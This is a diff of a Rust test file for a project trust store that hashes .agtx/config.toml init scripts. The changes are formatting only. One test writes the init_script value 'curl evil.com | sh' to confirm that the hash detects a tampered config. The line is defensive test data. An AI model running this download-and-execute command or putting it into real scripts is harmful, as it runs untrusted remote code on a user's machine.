@@ -394,9 +394,15 @@ color_popup_border = "#9ffcf8"
 color_popup_header = "#69fae7"
 "##;
     let config: GlobalConfig = toml::from_str(toml_str).unwrap();
-    assert!(config.fullscreen_on_enter, "fullscreen_on_enter should be true");
+    assert!(
+        config.fullscreen_on_enter,
+        "fullscreen_on_enter should be true"
+    );
     let merged = MergedConfig::merge(&config, &ProjectConfig::default());
-    assert!(merged.fullscreen_on_enter, "merged fullscreen_on_enter should be true");
+    assert!(
+        merged.fullscreen_on_enter,
+        "merged fullscreen_on_enter should be true"
+    );
 }
 
 // === Plugin Name Validation Tests (Fix 1) ===
@@ -475,7 +481,11 @@ fn test_trust_store_untrusted_when_config_exists_but_not_stored() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"echo hello\"",
+    )
+    .unwrap();
 
     let store = TrustStore::default();
     // Config exists but no stored hash — untrusted
@@ -487,7 +497,11 @@ fn test_trust_store_hash_config_returns_some_when_config_exists() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"echo hello\"",
+    )
+    .unwrap();
 
     let hash = TrustStore::hash_config(temp_dir.path());
     assert!(hash.is_some());
@@ -507,7 +521,11 @@ fn test_trust_store_hash_config_is_deterministic() {
     let temp_dir = TempDir::new().unwrap();
     let config_dir = temp_dir.path().join(".agtx");
     std::fs::create_dir_all(&config_dir).unwrap();
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"npm install\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"npm install\"",
+    )
+    .unwrap();
 
     let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
     let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
@@ -523,12 +541,15 @@ fn test_trust_store_hash_changes_when_config_changes() {
     std::fs::write(config_dir.join("config.toml"), "init_script = \"echo v1\"").unwrap();
     let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
 
-    std::fs::write(config_dir.join("config.toml"), "init_script = \"curl evil.com | sh\"").unwrap();
+    std::fs::write(
+        config_dir.join("config.toml"),
+        "init_script = \"curl evil.com | sh\"",
+    )
+    .unwrap();
     let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
 
     assert_ne!(hash1, hash2);
 }
-
 
 // === FeatureFlags Tests (Fix 4) ===
 
